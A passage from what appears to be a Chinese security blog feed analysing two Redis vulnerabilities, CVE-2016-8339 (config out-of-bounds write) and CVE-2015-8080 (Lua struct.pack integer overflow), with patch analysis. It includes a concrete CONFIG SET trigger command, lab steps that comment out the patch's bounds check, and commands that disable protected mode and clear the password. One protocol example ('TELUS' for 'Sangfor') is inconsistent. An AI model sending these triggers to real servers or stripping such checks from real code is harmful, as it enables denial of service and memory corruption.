时，class为master的情况。client-output-buffer-limit只是预期设置normal，slave和pubsub三类客户端，但是master也是一个有效的客户端。通过提供的客户端类型master，client_obuf_limit数组会溢出，随后的结构变量将被覆盖。</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-8339-Redis%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/16.png"></p><h4 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h4><p>​        在/src/config.c中的loadServerConfigFromString函数，未考虑class等于3的情况，导致class值等于3时，写入server.client_obuf_limits[class]值，导致索引越界写入。</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-8339-Redis%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/2.png"></p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-8339-Redis%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/3.png"></p><p>​        首先，查看server结构体的结构，server结构体在/src/server.h中声明。</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-8339-Redis%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/7.png"></p><p>​        其redisServer结构如下：</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-8339-Redis%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/6.png"></p><p>​        结构包含很多属性，其中预定义了clinet_obuf_limits数组的大小。</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-8339-Redis%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/5.png"></p><p>​    在/src/server.h中宏定义了CLIENT_TYPE_OBUF_COUNT为3，同时发现了CLIENT_TYPE_MASTER值为3。</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-8339-Redis%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1.png"></p><p>​        </p><p>​        目前确定了server.client_obuf_limits数组大小为3，也就是索引取值只能为0，1，2，如果索引值为3，则会发生越界读写。分析getClientTypeByName函数，看看class值如何为3。</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-8339-Redis%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/8.png"></p><p>​        getClientTypeByName函数通过输入的name值，返回相应的类型名，当name为master时，返回CLIENT_TYPE_MASTER，    在/src/server.h中宏定义CLIENT_TYPE_MASTER即为3。</p><p>​        此时，class被赋值CLIENT_TYPE_MASTER，即为3，直接对server.client_obuf_limits[3]赋值，索引越界，导致越界写入。</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-8339-Redis%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/3.png"></p><p>​        同样的问题也存在在/src/config.c的configSetCommand函数中。</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-8339-Redis%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/12.png"></p><p>​        此漏洞就是未考虑CONFIG SET client-output-buffer-limit ，class为master的情况。client-output-buffer-limit只是预期设置normal，slave和pubsub三类客户端，但是master也是一个有效的客户端。通过提供的客户端类型master，client_obuf_limit数组会溢出，随后的结构变量将被覆盖。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CONFIG SET client-output-buffer-limit &lt;class&gt; &lt;hard limit&gt; &lt;soft limit&gt; &lt;soft seconds&gt;</span><br></pre></td></tr></table></figure><h4 id="漏洞触发过程"><a href="#漏洞触发过程" class="headerlink" title="漏洞触发过程"></a>漏洞触发过程</h4><p>​        在/src/config.c中的loadServerConfigFromString函数，未考虑class等于3的情况，导致class值等于3时，写入server.client_obuf_limits[class]值，导致索引越界写入。</p><p>​        目前确定了server.client_obuf_limits数组大小为3，也就是索引取值只能为0，1，2，如果索引值为3，则会发生越界读写。</p><p>​        getClientTypeByName函数通过输入的name值，返回相应的类型名，当name为master时，返回CLIENT_TYPE_MASTER，在/src/server.h中宏定义CLIENT_TYPE_MASTER即为3。</p><p>​        此时，class被赋值CLIENT_TYPE_MASTER，即为3，直接对server.client_obuf_limits[3]赋值，索引越界，导致越界写入。</p><p>​        同样的问题也存在在/src/config.c的configSetCommand函数中。</p><p>​        此漏洞就是未考虑CONFIG SET client-output-buffer-limit ，class为master的情况。client-output-buffer-limit只是预期设置normal，slave和pubsub三类客户端，但是master也是一个有效的客户端。通过提供的客户端类型master，client_obuf_limit数组会溢出，随后的结构变量将被覆盖。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CONFIG SET client-output-buffer-limit &lt;class&gt; &lt;hard limit&gt; &lt;soft limit&gt; &lt;soft seconds&gt;</span><br></pre></td></tr></table></figure><h4 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h4><p>​        补丁增加了对class的值与CLIENT_TYPE_MASTER判断，如果等于CLIENT_TYPE_MASTER（3），则不会进行赋值，跳转到报错函数。</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-8339-Redis%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/17.png"></p><h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><p>​        向靶机发送config set命令将class字段设为master，则会发生越界写入。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CONFIG SET client-output-buffer-limit &quot;master 3735928559 3405691582 373529054&quot;</span><br></pre></td></tr></table></figure><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-8339-Redis%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/14.png"></p><p>​        靶机返回ok，代表越界写入成功。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote><ul><li><a href="https://github.com/antirez/redis/commit/6d9f8e2462fc2c426d48c941edeb78e5df7d2977">https://github.com/antirez/redis/commit/6d9f8e2462fc2c426d48c941edeb78e5df7d2977</a></li><li><a href="https://talosintelligence.com/vulnerability_reports/TALOS-2016-0206/">https://talosintelligence.com/vulnerability_reports/TALOS-2016-0206/</a></li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h2&gt;&lt;h3 id=&quot;漏洞简介&quot;&gt;&lt;a href=&quot;#漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;漏洞简介&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="1. 漏洞相关" scheme="http://example.com/categories/1-%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"/>
    
    <category term="Redis" scheme="http://example.com/categories/1-%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/"/>
    
    
    <category term="Redis" scheme="http://example.com/tags/Redis/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2015-8080_Redis getnum整数溢出漏洞</title>
    <link href="http://example.com/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-8080-Redis-getnum%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-8080-Redis-getnum%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-07-06T08:27:06.000Z</published>
    <updated>2021-07-06T08:45:43.020Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><ul><li>漏洞名称：Redis缓冲区溢出漏洞</li><li>漏洞编号： CVE-2015-8080/CVE-2020-14147</li><li>漏洞类型：缓冲区溢出</li><li>CVSS评分：【CVSS v3.0：7.7】</li><li>漏洞危害等级：高危</li></ul><h3 id="组件概述"><a href="#组件概述" class="headerlink" title="组件概述"></a>组件概述</h3><p>​        Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。它通常被称为数据结构服务器，因为值（value）可以是字符串(String), 哈希(Hash), 列表(list), 集合(sets) 和 有序集合(sorted sets)等类型。</p><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>​        Redis 6.0.3之前的lua_struct.c中的getnum函数中存在整数溢出漏洞，这允许具有上下文相关权限的攻击者在Redis会话中运行Lua代码，从而导致拒绝服务（内存损坏和应用程序崩溃）。</p><h3 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h3><p>​        Redis部署在服务器端，开启6379端口；攻击者，通过构造RESP协议包，利用struct.pack方法用于转换指定为第一个参数的非常大的整数（2^31），从而能触发整数溢出，再导致缓冲区溢出。</p><h3 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><p>​        Redis 小于 6.0.3</p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><a href="https://github.com/antirez/redis/commit/ef764dde1cca2f25d00686673d1bc89448819571">https://github.com/antirez/redis/commit/ef764dde1cca2f25d00686673d1bc89448819571</a></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="应用协议"><a href="#应用协议" class="headerlink" title="应用协议"></a>应用协议</h3><p>6379/RESP（Redis的序列化协议）</p><h3 id="环境安装-搭建"><a href="#环境安装-搭建" class="headerlink" title="环境安装/搭建"></a>环境安装/搭建</h3><h4 id="Linux下安装Redis-6-0-0"><a href="#Linux下安装Redis-6-0-0" class="headerlink" title="Linux下安装Redis 6.0.0"></a>Linux下安装Redis 6.0.0</h4><p>​        首先，Redis对全版本进行了补丁修复，为了复现漏洞，将Redis 6.0.0源码改为未打CVE-2020-14147补丁之前的状态。</p><p>​        进入路径，找到lua_struct.c文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\redis-6.0.0\deps\lua\src、lua_struct.c</span><br></pre></td></tr></table></figure><p>​        用编辑器，注释以下98-99行代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (a &gt; (INT_MAX / 10) || a * 10 &gt; (INT_MAX - (**fmt - &#x27;0&#x27;)))</span><br><span class="line">        luaL_error(L, &quot;integral size overflow&quot;);</span><br></pre></td></tr></table></figure><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-8080-Redis-getnum%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/10.png"></p><p>​        使用以下命令下载，提取和编译Redis 6.0.0：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ wget https://download.redis.io/releases/redis-6.0.0.tar.gz</span><br><span class="line">$ tar xzf redis-6.0.0.tar.gz</span><br><span class="line">$ cd redis-6.0.0</span><br><span class="line">$ make</span><br></pre></td></tr></table></figure><p>PS：中间make会报错</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-8080-Redis-getnum%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/2.png"></p><p>​        在源码的README.md文件中看到解释</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-8080-Redis-getnum%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/3.png"></p><p>​        解决办法(针对2.2以上的版本)<br>​        清理上次编译残留文件，重新编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make distclean  &amp;&amp; make</span><br></pre></td></tr></table></figure><p>​    这个错误的本质是我们在开始执行make 时遇到了错误（大部分是由于gcc未安装），然后我们安装好了gcc 后，我们再执行make ,这时就出现了jemalloc/jemalloc.h: No such file or directory。这是因为上次的编译失败，有残留的文件，我们需要清理下，然后重新编译就可以了。</p><p>​        <code>src</code> 目录 中现在提供了已编译的二进制文件 。使用以下命令运行Redis服务：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ src/redis-server</span><br></pre></td></tr></table></figure><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-8080-Redis-getnum%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/4.png"></p><p>​        可以使用内置客户端与Redis进行交互：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ src/redis-cli</span><br><span class="line">redis&gt; set foo bar</span><br><span class="line">OK</span><br><span class="line">redis&gt; get foo</span><br><span class="line">&quot;bar&quot;</span><br></pre></td></tr></table></figure><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-8080-Redis-getnum%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/5.png"></p><p>​        Redis服务端，配置远程连接密码：</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-8080-Redis-getnum%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/7.png"></p><p>​        Redis客户端，远程连接：</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-8080-Redis-getnum%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/6.png"></p><h4 id="安装Lua"><a href="#安装Lua" class="headerlink" title="安装Lua"></a>安装Lua</h4><p>​        Linux安装 Lua ，下载源码包并在终端解压编译即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -R -O http://www.lua.org/ftp/lua-5.3.0.tar.gz</span><br><span class="line">tar zxf lua-5.3.0.tar.gz</span><br><span class="line">cd lua-5.3.0</span><br><span class="line">make linux test</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>​        make报错，找不到readline/readline.h</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-8080-Redis-getnum%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/8.png"></p><p>​        原因是缺少 <code>libreadline-dev</code> 依赖包，安装依赖包：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install libreadline-dev</span><br></pre></td></tr></table></figure><p>​        再次编译安装后，成功：</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-8080-Redis-getnum%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/9.png"></p><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>​        利用Python脚本poc.py来重现该漏洞。 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python poc.py &lt;host&gt; [&lt;port&gt;]</span><br></pre></td></tr></table></figure><p>​        初次连接，发送poc时，提示redis运行保护模式，只允许本地访问，有三种关闭方式，此处选择第一种关闭方式：</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-8080-Redis-getnum%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/15.png"></p><p>​        根据提示关闭，保护模式，并且取消密码设置。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CONFIG SET protected-mode no</span><br><span class="line">CONFIG SET requirepass &#x27;&#x27;</span><br></pre></td></tr></table></figure><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-8080-Redis-getnum%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/16.png"></p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-8080-Redis-getnum%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/20.png"></p><p>​        再次发送poc，无数据回显，拒绝服务攻击成功。</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-8080-Redis-getnum%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/17.png"></p><p>​        Redis服务端报段错误，说明漏洞触发。</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-8080-Redis-getnum%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/21.png"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="技术背景"><a href="#技术背景" class="headerlink" title="技术背景"></a>技术背景</h3><p>​        Redis是轻量级的，非易失性键值数据存储。 它通过Redis序列化协议（RESP）提供对简单易变数据结构的访问，该协议是基于TCP的协议。 与大多数其他数据库一样，Redis遵循客户端—服务器模型。 客户端能够通过Redis命令在Redis服务器上创建，修改和检索记录。 </p><p>​        例如，以下命令创建“ TEST”字符串记录并将其分配给“ 1234”键值，将此记录修改为“ TEST2”并分别检索记录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SET 1234 TEST</span><br><span class="line">GETSET 1234 TEST2</span><br><span class="line">GET 1234</span><br></pre></td></tr></table></figure><p>​        有关Redis命令的完整列表，请参考 <a href="http://redis.io/commands">http://redis.io/commands</a></p><p>​        Redis客户端通过端口6379通过TCP使用Redis序列化协议（RESP）与服务器进行通信。可通过 <a href="http://redis.io/topics/protocol%E8%8E%B7%E5%BE%97%E8%AF%A5%E5%8D%8F%E8%AE%AE%E8%AF%A6%E7%BB%86%E8%AF%B4%E6%98%8E%E3%80%82">http://redis.io/topics/protocol获得该协议详细说明。</a> RESP使用五种数据类型，这些数据类型由相应数据的第一个字节标识：</p><ul><li><p>简单字符串以“ +”字符开头</p></li><li><p>错误以“-”字符开头</p></li><li><p>整数以“：”字符开头</p></li><li><p>批量字符串以“ $”字符开头</p></li><li><p>数组以“ *”字符开头</p><p>​    批量字符串以“ $”字符开头，后跟相应字符串的长度。 以下重点介绍如何将“ Sangfor”表示为大容量字符串：</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$7 CRLF</span><br><span class="line">TELUS</span><br></pre></td></tr></table></figure><p>​        其中CRLF表示新的行序列回车（CR），后跟换行（LF）。 </p><p>​        RESP数组以“ *”字符开头，后跟数组中的元素数。 下面说明了一个由2个元素组成的大容量字符串数组：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*2 CRLF</span><br><span class="line">$7 CRLF</span><br><span class="line">Sangfor CRLF</span><br><span class="line">$4 CRLF</span><br><span class="line">TEST CRLF</span><br></pre></td></tr></table></figure><p>​        所有Redis命令都通过RESP字符串数组发送到服务器。 例如，上述SET命令将以下形式发送：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">*3 CRLF</span><br><span class="line">$3 CRLF</span><br><span class="line">SET CRLF</span><br><span class="line">$4 CRLF</span><br><span class="line">1234 CRLF</span><br><span class="line">$4 CRLF</span><br><span class="line">TEST CRLF</span><br></pre></td></tr></table></figure><p>​        Lua是Redis 支持的轻量级脚本语言。 Redis内置了Lua解释器。Lua在Redis中的使用方法，可参考<a href="https://www.redisgreen.net/blog/intro-to-lua-for-redis-programmers/">https://www.redisgreen.net/blog/intro-to-lua-for-redis-programmers/</a></p><p>​        Redis客户端可通过EVAL命令使用此解释器。 Lua脚本允许用户管理和操纵Redis服务器上的记录。 例如，以下Lua脚本可用于执行上述SET命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EVAL &quot;redis.call(&#x27;set&#x27;,&#x27;1234&#x27;,&#x27;TEST&#x27;)&quot; 0</span><br></pre></td></tr></table></figure><p>​        执行此Lua脚本的另一种方法是使用SCRIPT LOAD和EVALSHA命令。 SCRIPT LOAD命令在服务器上缓存Lua脚本，并返回SHA1摘要。 EVALSHA命令可以与此SHA1摘要一起用作执行脚本的参数。 下面是一个示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SCRIPT LOAD &quot;redis.call(&#x27;set&#x27;,&#x27;1234&#x27;,&#x27;TEST&#x27;)&quot; 0</span><br><span class="line">EVALSHA &lt;SHA1 digest from above&gt;</span><br></pre></td></tr></table></figure><p>​        Lua还提供了分别使用struct.pack和struct.unpack方法将Lua变量与C类型的Stucts相互转换的方法。 例如，以下内容可用于包装整数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">struct.pack (&quot;&lt;I2&quot;, 10)</span><br></pre></td></tr></table></figure><ul><li>“I”指定整数是无符号的（“ i”用于有符号整数）</li><li>“&lt;”指定应以小端格式表示（“&gt;”用于大端格式）</li><li>“2”指定整数为2个字节长</li><li>“10”指定要打包的整数的值</li></ul><h3 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h3><h4 id="漏洞利用过程"><a href="#漏洞利用过程" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h4><p>​        Redis中存在堆栈缓冲区溢出漏洞。 在攻击情况下，struct.pack方法用于转换指定为第一个参数的非常大的整数（2^31）。 lua_struct.c尝试通过调用getnum（）将此字符串参数转换为整数。 这导致整数溢出，导致大小被错误地计算为负数，从而绕过边界检查。 然后，此负数通过optsize（）强制转换为size_t类型的变量，这将其解释为大正数。 之后，putinteger（）尝试将由这个大数字表示的字节数复制到32字节的缓冲区中，从而导致缓冲区溢出。</p><h4 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h4><p>​        以下代码段摘自lua_struct.c，Redis版本6.0.0。 </p><p>​        分析lua_struct.c中b_pack（）函数，size变量存放optsize（）函数的返回值，optsize（）函数将有符号的int类型转换为size_t（无符号的int类型）整数溢出发生字此函数内，之后size变量传入putinteger（）函数，缓冲区溢出发生在此函数内。</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-8080-Redis-getnum%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/11.png"></p><p>​        先跟进optsize（）函数，看如何处理opt变量和fmt二级指针（指向指针的指针），发现当opt变量为字符’i’或’I’时，将fmt二级指针传入</p><p>getnum（）函数，将返回的值存入sz变量中，if语句判断sz变量是否大于MAXINTSIZE；当sz发生整数溢出时，值为负值且小于MAXINTSIZE（0x7fffffff），所以跳过此报错判断。</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-8080-Redis-getnum%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/12.png"></p><p>​        跟进getnum（）函数，字符串转整型，缺少边界检查，当字符串表示的数大于MAXINTSIZE（0x7fffffff）时，直接返回负值。<img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-8080-Redis-getnum%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/13.png"></p><p>​        跟进putinteger（）函数，变量size是无符号的整数，经过int类型转换后，负值变为一个大于0x7fffffff的大数，buff数组范围为MAXINTSIZE（0x7fffffff），size变量范围大于MAXINTSIZE（0x7fffffff），故导致缓冲区溢出。</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-8080-Redis-getnum%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/14.png"></p><h4 id="漏洞触发过程"><a href="#漏洞触发过程" class="headerlink" title="漏洞触发过程"></a>漏洞触发过程</h4><p>​        struct.pack指定为第一个参数的非常大的整数（2^31）,b_pack（）———&gt;optsize（）———&gt;getnum（）导致整数溢出；返回的无符号变量size传入，putinteger（）导致缓冲区溢出。</p><p>​        发送poc后，到达崩溃现场，ESP与EBP中间地址被覆盖：</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-8080-Redis-getnum%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/18.png"></p><p>​        Redis服务端尝试恢复内存数据失败后退出进程，达到拒绝服务目的。</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-8080-Redis-getnum%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/19.png"></p><h4 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h4><p>​        官方已经发布补丁，在getnum（）函数处，增加lua_State变量指针L，来存放错误信息，在98-99行增加代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (a &gt; (INT_MAX / 10) || a * 10 &gt; (INT_MAX - (**fmt - &#x27;0&#x27;)))</span><br><span class="line">        luaL_error(L, &quot;integral size overflow&quot;);</span><br></pre></td></tr></table></figure><p>​        对当前变量a的值做判断，若当前a大于INT_MAX/10或者当前a*10大于INT_MAX-当前位的值，则返回报错信息L，提示size值超过缓冲区的值。从根本上避免了整数溢出，也避免了后续因为有符号上溢，而导致的缓冲区溢出。</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-8080-Redis-getnum%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1.png"></p><h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><h4 id="攻击包分析"><a href="#攻击包分析" class="headerlink" title="攻击包分析"></a>攻击包分析</h4><p>​        